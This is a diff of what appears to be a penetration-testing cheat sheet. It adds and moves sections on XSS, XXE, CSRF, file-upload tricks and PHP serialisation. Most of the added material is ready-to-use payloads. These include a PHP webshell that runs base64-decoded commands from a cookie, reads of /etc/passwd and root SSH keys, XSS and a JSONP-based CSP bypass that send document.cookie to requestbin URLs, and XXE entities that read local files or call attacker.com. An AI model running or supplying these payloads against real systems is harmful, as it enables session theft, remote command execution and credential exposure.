@@ -264,6 +264,7 @@ $ <?php passthru(['w']); ?>
 <?php require_once('../../etc/passwd'); ?> 
 <?php include('../../etc/passwd'); ?>
 <?php include_once('../../etc/passwd'); ?> 
+<?php system(base64_decode($_COOKIE[‘asjdkfljhasfd’])); ?>   // Steal cookies
 
 /* Try these PHP wrappers
  * More: https://secure.php.net/manual/en/wrappers.php
@@ -308,6 +309,71 @@ TRY OTHER LFI METHODS:
 /root/.bash_history
 /root/.ssh/id_rsa
 /root/.ssh/authorized_keys
+```
+
+
+### ============================================================
+### XSS
+### ============================================================
+
+**Useful JS web API methods for XSS**  
+Redirect a user/admin to your url to steal their cookies.
+```javascript
+fetch()
+window.onload()
+document.location()
+window.location.replace()
+window.location.reload()
+window.location.assign()
+```
+
+**Standard Payloads**
+```javascript
+/* PoC Payloads */
+<script>alert('hi')</script>
+<script>alert(document.cookie)</script>
+
+/* Filter Evasion Payloads */
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+<img src=x onerror="alert(document.cookie)">
+<img src="javascript:alert('XSS');">
+<img src=javascript:alert('XSS')>
+<img src=javascript:alert(&quot;XSS&quot;)>
+<a onmouseover="alert(document.cookie)">click me</a>
+<input type="image" src="javascript:alert(document.cookie)"
+
+/* PoC Payloads */
+document.write('<img src="http://requestbin.fullcontact.com/1bpkogg1?cook='+document.cookie+'">')
+```
+
+iframe
+```
+<iframe src="javascript:alert(0)"> 
+```
+
+**CSP Bypass**  
+Bypass via. JSONP API callback param:
+```javascript
+//Verify:
+<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=alert('xss');//"></script>
+
+//Payload Original:
+<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c='+document.cookie);//"></script>
+
+//Payload Step #1 => Encode x1:
+<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%3D'%2Bdocument.cookie);//"></script>
+
+//Payload Step #2 => Encode x2:
+<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%253D'%252Bdocument.cookie);//"></script>
+
+/* Note:
+Encoding needs to be performed twice as the initial POST request to the target server will decode it once, then another round of decoding will be performed upon the target's callback to your attacker url.
+*/
+```
+
+**Filter Evasion**
+```
+ADD SHIT HERE
 ```
 
 ### ============================================================
@@ -628,85 +694,56 @@ SSTI Exploit Tool: https://github.com/epinna/tplmap
 <element>&xxe;</element>
 ```
 
+More Payloads:
+```xml
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt">]><foo>&xxe;</foo>
+```
+
 **XXE Out-of-Bounds attack:**
 ```
 
 ```
 
-**XML Parser/Filter Bypass:**
+**XML Parser/Filter Bypass:**  
 _Example blacklisted keywords: [file://] [/etc] [passwd] or 2nd level XML docs included_
 ```
 
 ```
 
 ### ============================================================
-### XSS
+### Other Server-Side Magic
 ### ============================================================
 
-**Useful JS web API methods for XSS**  
-Redirect a user/admin to your url to steal their cookies.
-```javascript
-fetch()
-window.onload()
-document.location()
-window.location.replace()
-window.location.reload()
-window.location.assign()
-```
+File Upload Exploits:
+* Read: https://hackerone.com/reports/135072 (RCE in profile pic upload)
+* Read: https://imagetragick.com/ (Imagemagick vulns)
+* Change file extensions
+* `cat exploit.php lol.png > lolv2.png`
+* Check authorisation / authentication:
+   * Upload requires admin
+   * Upload API endpoint is unauthenticated
+* Look for outdated plugins
 
-**Standard Payloads**
-```javascript
-/* PoC Payloads */
-<script>alert('hi')</script>
-<script>alert(document.cookie)</script>
-
-/* Filter Evasion Payloads */
-&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-<img src=x onerror="alert(document.cookie)">
-<img src="javascript:alert('XSS');">
-<img src=javascript:alert('XSS')>
-<img src=javascript:alert(&quot;XSS&quot;)>
-<a onmouseover="alert(document.cookie)">click me</a>
-<input type="image" src="javascript:alert(document.cookie)"
-
-/* PoC Payloads */
-document.write('<img src="http://requestbin.fullcontact.com/1bpkogg1?cook='+document.cookie+'">')
-```
-
-iframe
-```
-<iframe src="javascript:alert(0)"> 
-```
-
-**CSP Bypass**  
-Bypass via. JSONP API callback param:
-```javascript
-//Verify:
-<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=alert('xss');//"></script>
-
-//Payload Original:
-<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c='+document.cookie);//"></script>
-
-//Payload Step #1 => Encode x1:
-<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%3D'%2Bdocument.cookie);//"></script>
-
-//Payload Step #2 => Encode x2:
-<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%253D'%252Bdocument.cookie);//"></script>
-
-/* Note:
-Encoding needs to be performed twice as the initial POST request to the target server will decode it once, then another round of decoding will be performed upon the target's callback to your attacker url.
-*/
-```
-
-**Filter Evasion**
-```
-ADD SHIT HERE
-```
 
 ### ============================================================
 ### Cross-Site Request Forgery
 ### ============================================================
 
+CSRF: where an attacker uses a victim's session to perform a malicious request on an application which they're currently authenticated in.
+* CSRF is used for state-changing requests rather than theft of data. i.e. request to change admin email address.
+* Possible when there is no validation of the **origin of the request**
+* Common places to look for CSRF: Account settings / pages with admin privileges.
+
+CSRF steps:
+1. Victim: POST /changepwd.php
+2. Server: 200 OK
+3. Attacker: attack.com/changepwd.html
+     => trick victim into submitting form
+     => forged POST/changepwd request is made from attack.com origin.
+4. [STAGE CHANGE]: password is now changed to '1234'
+5. Attacker: Login with password '1234'
 
 
 ### ============================================================
@@ -788,17 +825,6 @@ Referer:localhost
 ```
 
 ### ============================================================
-### PHP Serialisation
-### ============================================================
-
-**PHP Magic Methods:**
-* `construct()`: Object is called when new, but unserialize() is not called
-* `destruct()`: Called when the Object is destroyed
-* `wakeup()`: Called automatically when unserialize
-* `sleep()`: Called when serialize
-* `toString()`: When the object is called as a string
-
-### ============================================================
 ### Amazon Web Services SSRF
 ### ============================================================
 
@@ -846,6 +872,18 @@ LFD => $ /docker-entrypoint.sh /init.sh ~/.aws/credentials.json
 
 More info on AWS testing: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3
 More info on exploiting AWS post-compromise: https://danielgrzelak.com/exploring-an-aws-account-after-pwning-it-ff629c2aae39
+
+
+### ============================================================
+### PHP Serialisation
+### ============================================================
+
+**PHP Magic Methods:**
+* `construct()`: Object is called when new, but unserialize() is not called
+* `destruct()`: Called when the Object is destroyed
+* `wakeup()`: Called automatically when unserialize
+* `sleep()`: Called when serialize
+* `toString()`: When the object is called as a string
 
 ### ============================================================
 ### REST APIs
